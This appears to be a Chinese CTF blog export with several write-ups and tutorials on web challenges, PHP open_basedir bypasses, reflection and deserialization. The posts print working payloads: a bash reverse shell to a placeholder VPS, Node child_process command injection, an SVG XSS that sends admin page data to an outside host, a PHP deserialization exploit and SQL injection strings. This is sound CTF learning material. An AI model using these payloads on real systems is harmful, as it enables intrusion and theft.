[{"title":"2019 defcon ctf 学习","date":"2019-05-18T16:00:00.000Z","path":"2019/05/19/defcon-ctf-学习/","text":"菜鸡web手这场比赛全程挂机……web是真的越来越难打了 cant_even_unplug_it一题脑洞了2333题目+hint放一放12345You know, we had this up and everything. Prepped nice HTML5, started deploying on a military-grade-secrets.dev subdomain, got the certificate, the whole shabang. Boss-man got moody and wanted another name, we set up the new names and all. Finally he got scared and unplugged the server. Can you believe it? Unplugged. Like that can keep it secret…Hint: these are HTTPS sites. Who is publicly and transparently logging the info you need?Just in case: all info is freely accessible, no subscriptions are necessary. The names cannot really be guessed. 一开始看到这道题目懵逼了，怎么没有网站？？？经过菜鸡谷歌+半懵半猜终于读懂了题目（wtcl他们在military-grade-secrets.dev这个子域建了一个网站，但是他们改变了网站名，所以我们首先要将原来的网站名找出来首先所有的域名和名称更改都通过DNS进行追踪，用https://securitytrails.com/dns-trails 去查看同一个子域下的其他域名，可以看到这个访问一下secret-storage.military-grade-secrets.dev发现会自动跳转去forget-me-not.even-more-militarygrade.pw这个网站现在我们再看一下forget-me-not.even-more-militarygrade.pw这个网站，可以看到这里有个DigitalOcean所以这个网站曾经在Digital Ocean上托管过，接着再去https://archive.org/web/ 去找网站的快照就会找到4月27日有一个 redacted-puzzleidentify分析一波，可以看到只有个别像素变了，其他基本没变1234567891011121314151617181920212223242526272829303132333435redacted-puzzle.gif[0] GIF 1280x720 1280x720+0+0 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[1] GIF 592x595 1280x720+341+61 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[2] GIF 592x602 1280x720+341+59 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[3] GIF 577x608 1280x720+353+56 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[4] GIF 409x610 1280x720+334+56 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[5] GIF 616x592 1280x720+332+76 8-bit sRGB 4c 80KB 0.000u 0:00.019redacted-puzzle.gif[6] GIF 616x619 1280x720+332+49 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[7] GIF 590x584 1280x720+362+49 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[8] GIF 486x586 1280x720+466+47 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[9] GIF 495x630 1280x720+460+45 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[10] GIF 504x630 1280x720+451+45 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[11] GIF 574x581 1280x720+323+96 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[12] GIF 635x635 1280x720+323+42 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[13] GIF 572x637 1280x720+387+42 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[14] GIF 352x287 1280x720+607+392 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[15] GIF 559x559 1280x720+320+121 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[16] GIF 640x640 1280x720+320+40 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[17] GIF 640x640 1280x720+320+40 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[18] GIF 458x640 1280x720+411+40 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[19] GIF 640x549 1280x720+320+131 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[20] GIF 640x559 1280x720+320+121 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[21] GIF 565x559 1280x720+395+121 8-bit sRGB 4c 80KB 0.000u 0:00.009redacted-puzzle.gif[22] GIF 347x528 1280x720+320+152 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[23] GIF 638x450 1280x720+320+107 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[24] GIF 636x634 1280x720+322+43 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[25] GIF 633x634 1280x720+324+43 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[26] GIF 632x630 1280x720+324+45 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[27] GIF 583x630 1280x720+370+45 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[28] GIF 583x625 1280x720+370+47 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[29] GIF 622x474 1280x720+330+198 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[30] GIF 620x618 1280x720+330+52 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[31] GIF 589x614 1280x720+332+52 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[32] GIF 449x612 1280x720+334+54 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[33] GIF 605x608 1280x720+336+56 8-bit sRGB 4c 80KB 0.000u 0:00.000redacted-puzzle.gif[34] GIF 600x431 1280x720+341+230 8-bit sRGB 4c 80KB 0.000u 0:00.000 stego看一下有个字母表？接着identify -verbose redacted-puzzle.gif查看一下图片签名，可以看到black被定义了三次？？123456789Colors: 1Histogram: 352240: ( 0, 0, 0,255) #000000FF blackColormap entries: 4Colormap: 0: ( 0, 0, 0,255) #000000FF black 1: ( 0, 0, 0,255) #000000FF black 2: ( 0, 0, 0,255) #000000FF black 3: (255,255,255, 0) #FFFFFF00 srgba(255,255,255,0) 因此即使底色为黑色，图片依旧能存储，所以其实图片的存储并不是真正的一整张图片的存储的，我们尝试一下修改一下每帧的调色板并且将它们保存成png图片123456789#!conding: utf-8from PIL import Image# 修改底色，保存图片imageObject = Image.open(\"./redacted-puzzle.gif\")for frame in range(0,imageObject.n_frames): imageObject.seek(frame) imageObject.putpalette([255,0,0,0,0,0,0,0,0]) rgb_im = imageObject.convert('RGB') rgb_im.save(\"./tmp/output-%02u.png\" % frame) 接下来就是脑洞了，拿到了上面的图片，都是一堆多边形，但是如果我们将它们全部拼在一起可以拿到一个八边形，让我们假设成二进制，就可以拿到一堆二进制，先看第一张图片所以这个图片的二进制数就是10001100我们将这些数字都列出来，联系字母表是32位，我们推测试base32变种12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 解密flag_alphabet = \"+-=ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;\"flag_bits=[ \"10001100\", \"01100011\", \"11100100\", \"01000110\", \"10000101\", \"00111101\", \"01000010\", \"10011000\", \"11100000\", \"11110100\", \"10000000\", \"00101101\", \"01110010\", \"00011100\", \"00001000\", \"10100101\", \"11010111\", \"01101110\", \"10100110\", \"10010001\", \"10111100\", \"10000100\", \"10000001\", \"10111001\", \"11010100\", \"00111011\", \"11001110\", \"11110010\", \"00011110\", \"10011101\", \"11001001\", \"11000111\", \"01100101\", \"00011110\", \"10011111\",]# base32解密flag_bits = \"\".join(flag_bits)result = \"\"for i in range(0,len(flag_bits),5): index = flag_bits[i:i+5] index = int(index,2) result += flag_alphabet[index]print(\"result: \", result) 所以最后解出来是 nodb源码有个这个东西12345678function validateForm() &#123; str = document.forms[\"myForm\"][\"password\"].value ptr = allocate(intArrayFromString(str), 'i8', ALLOC_NORMAL); ret = UTF8ToString(_authenticate(ptr)); console.log(ret); if (ret == \"success\") document.getElementsByClassName(\"text\")[0].innerText = \"SUCCESS\" return false;&#125; 所以如果一个字符串通过了_authenticate函数的认证而且放回seccess就是正确的flag了接下来我们找一下_authenticate在哪里出现过有一个wasm.wasm文件，我们先丢进去反编译一下，因为菜鸡的文件不知道为什么损坏了，所以只能贴上其他大师傅的图了可以看到，如果要返回success，那就要满足v6==69，但是这一段逆回去很难，代码很复杂，V6是计算这段字母里面有多少个字母是符合password的，因此，我们尝试一下暴力转v6，而且每一次强制匹配一个字母继续看wasm文件，将它转成wat文件（虽然也不算非常好看，但是还是能看出来的，搜一下1245只出现过一次，分析文件利用_authenticate返回正确的字数，我们一位位将flag爆出来","comments":true,"permalink":"https://xi4or0uji.github.io/2019/05/19/defcon-ctf-学习/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"open_basedir bypass","date":"2019-05-14T16:00:00.000Z","path":"2019/05/15/open_basedir-bypass/","text":"前言之前在出国赛题的时候，设置open_basedir的时候突发奇想，可不可以绕过open_basedir呢，谷歌了一波，发现确实有不少的tricks，遂来总结一波 DirectoryIterator + Glob列目录DirectoryIterator是一个php提供的用于查看文件系统目录的一个接口，调用它是可以直接看到文件目录的，但是如果我们设置了open_basedir的时候，用它列举不允许的目录，就会直接导致服务器500glob是自php5.3起用来查找匹配的文件路径模式的一个流包装器当他们组合一起的时候就很炫了12345678910111213141516&lt;?phpprintf('open_basedir: %s &lt;/br&gt;',ini_get('open_basedir'));$file_list = array();$it = new DirectoryIterator(\"glob:///*\");foreach ($it as $f)&#123; $file_list[] = $f-&gt;__toString();&#125;$it = new DirectoryIterator(\"glob:///.*\");foreach ($it as $f)&#123; $file_list[] = $f-&gt;__toString();&#125;sort($file_list);foreach ($file_list as $f)&#123; echo \"&#123;$f&#125;&lt;br/&gt;\";&#125; 可以看到，成功地列出了目录了，这个漏洞直到php7还能用，测试环境是linux+php7（摇头.gif realpath列目录realpath是php中一个将相对路径转化为绝对路径的方法，而如果开启了open_basedir的话，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在open_basedir里的文件的话，他就会返回file is not within the allowed path(s)，所以这个时候就可以类似于报错盲注去爆出文件名了这里有个小trick，利用windows下的通配符&lt;和&gt;去进行爆破可以快一点12345678910111213141516171819&lt;?phpini_set('open_basedir',dirname(__FILE__));printf(\"open_basedir: %s&lt;br/&gt;&lt;br/&gt;\", ini_get('open_basedir'));set_error_handler('isexist');$dir = 'd:/test/';$file = '';$chars = 'abcdefghijklmnopqrstuvwxyz0123456789-*/+_';for ($i=0; $i&lt;strlen($chars); $i++)&#123; $file = $dir.$chars[$i].'&lt;&lt;'; realpath($file);&#125;function isexist($errno, $errstr)&#123; $regex = '/File\\((.*)\\) is not within/'; printf(\"errstr: %s &lt;br/&gt;\",$errstr); preg_match($regex, $errstr, $mathes); if (isset($mathes[1]))&#123; printf(\"%s &lt;br/&gt;&lt;br/&gt;\", $mathes[1]); &#125;&#125; 可以看到，当报错的时候会将文件名也直接爆出来，因此如果文件名首字母不一致的话，跑一次就能直接将所有文件名跑出来了，如果重复问题也不大，改下前缀也都能出来的 SplFileInfo::getRealPath列目录SplFileInfo类是一个用来为单个文件的信息提供高级的面向对象的接口，这个类可以进行很多文件的方法，其中就有一个方法和之前的realpath很相似，就是getRealPath，这个方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了open_basedir的设定12345678910111213&lt;?phpini_set('open_basedir', dirname(__FILE__));printf(\"open_basedir: %s &lt;br/&gt;&lt;br/&gt;\", ini_get('open_basedir'));$basedir = 'd:/test/';$arr = array();$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';for ($i=0; $i &lt; strlen($chars); $i++) &#123; $info = new SplFileInfo($basedir . $chars[$i] . '&lt;&lt;'); $re = $info-&gt;getRealPath(); if ($re) &#123; echo $re.\"&lt;br&gt;\"; &#125;&#125; 这里基本就是realpath的利用，相差不大，甚至还简单一点 bindtextdomainbindtextdomain是一个域的操作的函数？？","comments":true,"permalink":"https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"sixstarCTF web 学习","date":"2019-05-08T07:03:29.438Z","path":"2019/05/08/sixstarCTF-web-学习/","text":"前段时间忙着国赛出题，没认真打这场比赛，补坑辣 WEBmywebsql这道题目考了mywebsql的一个cve还有信号处理？？坑点啊首先我们可以先弱口令admin/admin登录进去，然后就是谷歌做题了2333https://nvd.nist.gov/vuln/detail/CVE-2019-7731https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md大概操作是创建一个表在里面写一句shell，再备份数据库就可以成功写到一个shell了首先我们创建一个表，并在数据库中插入一句小马接着导出数据库，并且修改文件名为shell.php，至此我们就成功写了一个shell了接着御剑连过去，能看到一个flag文件和一个readflag文件我们没有权限直接读flag文件，尝试一下连接终端，但是我们没有输入就已经直接退出了接下来只能分析readflag文件了文件里面有个ualarm函数，可以发出时钟信号让终端停止当前的程序，所以我们没输入，就结束程序了先弹个shell，跟上面操作一样，就是改成sh文件就行1bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1 接着就是找命令让他停止了https://codingstandards.iteye.com/blog/836588因此我们可以先执行trap命令，然后就能慢慢进行下一步操作了最终payload1trap \"\" 14 接下来就是慢慢算式子，出flag了 996game一个小游戏，虽然我不知道怎样通关和通关是8是就能拿到flag（捂脸源码提示这个东西是用一个github项目改的接着路由没过滤好，所以就是下文件找不同在/js/server/GameServer.js有个这个东西可以看到改版多了个eval函数，接着执行err.message的东西所以我们现在是想办法控制报错信息了根据题目提示，db.a.find({&quot;b&quot;:{&quot;$gt&quot;:1,&quot;c&quot;:&quot;d&quot;}})，先本地尝试一下可以看到errormsg是可以控制的，然后就是想办法控制_id了接着跟去ObjectID可以看到方法的具体内容，这个要在github去下接着就是跟过去分析了因此最后只需要满足两个条件就能绕过了1&#123;“$gt”:”1”,”c”:”d”,”toHexString”:true,”id”:&#123;“length”:12&#125;&#125; 这个时候能得到报错123456 &#123; \"ok\":0, \"errmsg\":\"unknown operator: c\", \"code\":2,\"codeName\":\"BadValue\", \"name\":\"MongoError\"&#125; 所以此时eval内部的东西已经可控了，最后借用大佬们的脚本1234#进行lsClient.getPlayerID = () =&gt; (&#123; \"$gt\":1,\"socket.emit(require('child_process').execSync('ls'))\":\"bb\", toHexString: 'aaa', length: 0, id: &#123;length: 12&#125;&#125;)#perl运行读文件Client.getPlayerID = () =&gt; (&#123; \"$gt\":1,[`process.chdir('/');socket.emit('aaa');socket.emit(require('child_process').execSync('perl -e \\\\'use warnings;use strict;use IPC'+String.fromCharCode(58)+String.fromCharCode(58)+'Open2;$| = 1;chdir(\"/\");my $pid = open2(\\*out2, \\*in2, \"./readflag\") or die;my $reply = &lt;out2&gt;;print STDOUT $reply; $reply = &lt;out2&gt;;print STDOUT $reply; my $answer = eval($reply);print in2 \" $answer \"; in2-&gt;flush();$reply = &lt;out2&gt;;print STDOUT $reply;print STDOUT $reply;print STDOUT $reply;print STDOUT $reply;\\\\'').toString('utf-8'))`]:\"bb\", toHexString: 'aaa', length: 0, id: &#123;length: 12&#125;&#125;) MISCbabyflash首先可以拿到一个swf文件，然后去反编译一下，可以看到有一堆图片和一个音频图片很规律，张数刚好是441=21*21，尝试一下拼在一起12345678910111213141516171819202122232425262728293031323334#先读图片出来成0和1#coding: utf-8from PIL import Imagedef run(a): img = Image.open(\"frames/\"+str(i)+\".png\") a,b,c,d = img.getpixel((50,50)) return as = ''for i in range(1,442): if run(i)==0: s += '1' else: s += '0'print(s)#然后再拼在一起#coding: utf-8from PIL import Imagelength = 21img = Image.new('RGB', (length*5, length*5))#黑点为1白点为0data = \"111111100110001111111100000100111001000001101110101011001011101101110100100101011101101110100101101011101100000100110001000001111111101010101111111000000001010100000000111011111011111000100110110011011101111011101101111001101111011010010001100000000011111010100000100011000000000001011100110011111111101011100110101100000101101000100010101110101011011000001101110100101101110000101110101101110110001100000101011100010010111111101101100001011\"for x in range(length): for y in range(length): if data[x*length+y] == '1': for xx in range(x*5, x*5+5): for yy in range(y*5, y*5+5): img.putpixel([xx, yy], (0,0,0)) else: for xx in range(x*5, x*5+5): for yy in range(y*5, y*5+5): img.putpixel([xx, yy], (255,255,255))img.save('out.png') 拼在一起确实是一个二维码，扫出来只有前半个flag，那么后面的flag就是音频隐写了接下来的音频看频谱图就能看出来了 参考https://xz.aliyun.com/t/5006#toc-2https://aluvion.github.io/2019/05/05/CTF2019-996game%E5%A4%8D%E7%8E%B0-nodejs-mongodb%E4%BD%BF%E7%94%A8/","comments":true,"permalink":"https://xi4or0uji.github.io/2019/05/08/sixstarCTF-web-学习/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"反射","date":"2019-05-07T07:14:45.468Z","path":"2019/05/07/反射/","text":"前言前段时间的国赛考到了这个东西，肉鸡就来总结一下了 reflection in PHP在php运行的时候，反射可以对类、接口、函数、方法或扩展进行反向工程，此外，还可以取出函数、类和方法中的文档注释。 简单的demo下面放一个简单的demo，简单看一下反射是怎样实现的12345678910111213141516171819202122232425262728&lt;?phpclass test&#123; private $test = \"Ariel\"; private $value = \"Xi4or0uji\"; private function get()&#123; $this -&gt; test = \"Ariel\"; return $this-&gt;test; &#125; private function hello()&#123; return \" hello world\"; &#125;&#125;$test = new test();//获得方法的返回值$ref = new ReflectionClass($test);$method = $ref-&gt;getMethod(\"hello\");//setAccessible可以执行私有或保护方法$method -&gt; setAccessible(true);print $method -&gt; invoke($test).\"&lt;br&gt;\";//获得成员变量的名和值$reflect = new ReflectionClass($test);$props = $reflect-&gt;getProperties(ReflectionProperty::IS_PUBLIC | ReflectionProperty::IS_PRIVATE | ReflectionProperty::IS_PROTECTED);foreach ($props as $prop)&#123; $prop-&gt;setAccessible(true); print $prop-&gt;getName().\"&lt;br&gt;\"; print $prop-&gt;getValue($test).\"&lt;br&gt;\";&#125; 回显12345hello worldtestArielvalueXi4or0uji CTF题目上次的国赛题就有这题，具体可以看https://xi4or0uji.github.io/2019/04/22/2019-4-22-2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-writeup/#more reflection in JAVAjava的反射跟php的反射很相似，想解剖一个类，先要获取到这个类的字节码文件对象，使用的是Class类中的方法，因此我们要先获取到每一个字节码文件对应的Class类型的对象 简单的demo下面还是一个简单的demo去说明怎么调用123456789101112131415161718192021222324252627282930313233//Member.java文件package com.company;public class Member &#123; public void show(String s)&#123; System.out.println(\"hello \" + s); &#125;&#125;//Test.java文件package com.company;import java.lang.reflect.Method;public class Test &#123; public static void main(String[] args) throws Exception&#123;// 获取Class对象 Class stuClass = Class.forName(\"com.company.Member\");// 获得所有公有方法 System.out.println(\"get public function\"); stuClass.getMethods(); Method[] methodArray = stuClass.getMethods(); for (Method m : methodArray)&#123; System.out.println(m); &#125;// 通过反射调用Student下的show方法 Method m = stuClass.getMethod(\"show\", String.class); System.out.println(m); //实例化一个Student对象 Object obj = stuClass.getConstructor().newInstance(); m.invoke(obj, \"Ariel\"); &#125;&#125; 然后我们就能看到成功调用了 反射调出计算器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package com.company;import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;import java.lang.reflect.Method;public class ReflectionTest implements Serializable &#123; private Integer n; public ReflectionTest(Integer n)&#123; this.n = n; &#125; public String int2string(Integer n)&#123; System.out.println(\"here\"); return Integer.toString(n); &#125; private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; in.defaultReadObject(); try&#123; Method method = java.lang.Runtime.class.getMethod(\"exec\", String.class); Object result = method.invoke(Runtime.getRuntime(), \"calc.exe\"); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args)&#123; ReflectionTest x = new ReflectionTest(12); operation.ser(x); operation.deser(); &#125;&#125;class operation &#123; public static void ser(Object obj)&#123; //序列化操作写数据 try&#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"Object.obj\")); oos.writeObject(obj); oos.flush(); oos.close(); &#125;catch (FileNotFoundException e)&#123; e.printStackTrace(); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void deser()&#123; //反序列化读数据 try&#123; File file = new File(\"Object.obj\"); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file)); Object x = ois.readObject(); System.out.println(x); ois.close(); &#125;catch (FileNotFoundException e)&#123; e.printStackTrace(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 参考https://www.php.net/manual/zh/intro.reflection.phphttps://aluvion.github.io/2019/04/25/%E5%8F%8D%E5%B0%84/http://pupiles.com/java_unserialize2.html","comments":true,"permalink":"https://xi4or0uji.github.io/2019/05/07/反射/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"},{"name":"java","slug":"java","permalink":"https://xi4or0uji.github.io/tags/java/"}]},{"title":"CONFidence CTF的一道题","date":"2019-04-24T16:00:00.000Z","path":"2019/04/25/CONFidence-CTF的一道题/","text":"这道题是之前在看先知的文章看到了，看了一下发现有点有趣，记录一下 题目地址：http://web50.zajebistyc.tf/预期解是svg xss，非预期是缓存投毒首先我们先看一下题目，进去是登录框，随便乱填就可以进去进去以后有一个头像上传的地方和secret的值，猜测应该是拿到管理员的secret值，然后利用点应该就是头像上传的地方了 SVG XSS在测试的过程中发现可以上传任意后缀的文件，但是文件头必须是图片格式且尺寸只能是100*100，而且上传html文件时发现服务器会将文件当做图片解析，因此后台应该是根据文件头去进行解析的，所以我们可以找一个可以进行xss的图片，也就是svg原理参考： https://www.hackersb.cn/hacker/85.htmlpayload123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?&gt;&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;&lt;svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" width=\"100px\" height=\"100px\" viewBox=\"0 0 751 751\" enable-background=\"new 0 0 751 751\" xml:space=\"preserve\"&gt; &lt;image id=\"image0\" width=\"751\" height=\"751\" x=\"0\" y=\"0\" href=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo\" /&gt;&lt;script&gt; var xmlhttp = new XMLHttpRequest(); var response; xmlhttp.onreadystatechange = function() &#123; if (4 == xmlhttp.readyState) &#123; if (200 == xmlhttp.status) &#123; location.href='http://onsdtb.ceye.io?'+btoa(xmlhttp.responseText); &#125; &#125; &#125;; xmlhttp.open(\"GET\", \"/profile/admin\"); xmlhttp.send();&lt;/script&gt;&lt;/svg&gt; 缓存投毒这里贴一波国外的师傅的writeup：https://ctftime.org/writeup/13925因为这个考点触及到我的知识盲区了，肉鸡决定研究一下 参考","comments":true,"permalink":"https://xi4or0uji.github.io/2019/04/25/CONFidence-CTF的一道题/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019 全国大学生信息安全竞赛 writeup","date":"2019-04-21T16:00:00.000Z","path":"2019/04/22/2019-全国大学生信息安全竞赛-writeup/","text":"上周末跟队友打了一场国赛，题目质量还是不错的，记录下wp misc签到摄像头检测到三个人头就行了 saleae百度logicdata，发现有个工具，打开就是一些波形，直接对着时钟位读二进制转成ascii码就能出flag了flag{12071397-19d1-48e6-be8c-784b89a95e07}然后无敌头铁王第二天发现SPI通道直接就会转字符了，第一天手撕是真的头铁…… usbasp还是SPI通道，将标准位调高就直接出flag了 webjustsoso一开始伪协议拿到源码，然后就是反序列化利用了123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;html&gt;&lt;?phpindex.phperror_reporting(0); $file = $_GET[\"file\"]; $payload = $_GET[\"payload\"];if(!isset($file))&#123; echo 'Missing parameter'.'&lt;br&gt;';&#125;if(preg_match(\"/flag/\",$file))&#123; die('hack attacked!!!');&#125;@include($file);if(isset($payload))&#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value)&#123; if (preg_match(\"/flag/\",$value)) &#123; die('stop hacking!'); exit(); &#125; &#125; $payload = unserialize($payload);&#125;else&#123; echo \"Missing parameters\"; &#125; ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt;hint.php&lt;?php class Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) &#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125;?&gt; 可以看到Handle类有个__destruct函数可以触发getFlag函数，但是__wakeup函数会将所有东西清空，这里改下属性个数就能绕过，参考SugerCRM漏洞，然后getFlag函数的条件可以用指针绕过，以前安恒的月赛也考过，最后flag的匹配可以利用parse_url漏洞，三个斜杠就能绕过了exp1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token = &amp;$this-&gt;token_flag; &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag)&#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125;$h = new Handle(new Flag('flag.php'));echo urlencode(serialize($h));//$c = \"O:6:\\\"Handle\\\":3:&#123;s:14:\\\"Handlehandle\\\";O:4:\\\"Flag\\\":3:&#123;s:4:\\\"file\\\";s:8:\\\"flag.php\\\";s:5:\\\"token\\\";N;s:10:\\\"token_flag\\\";R:4;&#125;&#125;\"; 全宇宙最简单的sql这道题是报错盲注+mysql load data infile漏洞，比赛时没有做出来还是挺可惜的通过测试网站我们可以知道登陆密码错误的时候会回显登陆失败，如果语句有错的话就会回显数据库操作失败，但是这里有个坑点，可能是因为上了知道创宇的waf所以脚本盲注会出锅？debug一个下午最后发现用burp代理是能跑出来的，攻击语句是&#39; and (select locate(&#39;a&#39;,(select database()),1)=1)*999*pow(999,102)%23攻击出数据库是ctf，因为or被过滤了，所以不能直接爆出表名，想Innodb引擎注入发现权限不够，一度卡了很久，最后猜测表名是user，因为显示的是用户信息，然后，撞对了……获得了表名以后就是不知道列名的联合注入了，语句：&#39; and (select locate(&#39;a&#39;,(select2from (select 1,2 union select * from user)a limit 1,1),1)=1)*999*pow(999,102)%23最后就能爆出来用户名是admin，密码是F1AG@1s_at_/fll1llag_h3r3，这里又来一个坑点，可能服务器不是很好，都不知道跑到哪去了，因此大小写错乱，然后就做不下去了…….算是长个教训吧，以后用ascii码去跑，坑死我了……接下来登录进去就是mysql load data infile漏洞，改下github的脚本就能getflag了 love_math这道题一进去就发现很像网鼎杯的一道题，但是fuzz了一下发现字母全部过滤了？？？然后，莫得了留个坑等大佬们wp出来了学完补还是太菜了，看见有个calc.php却没想到去无参访问一下，结果就拿不到源码卡死了，甚至还以为是ssti……这里贴出源码进行分析12345678910111213141516171819202122232425262728 &lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c']))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die(\"太长了不会算\"); &#125; $blacklist = [' ', 't', 'r', 'n','\\'', '\"', '`', '[', ']']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/'. $blackitem . '/m', $content)) &#123; die(\"请不要输入奇奇怪怪的字符\"); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; 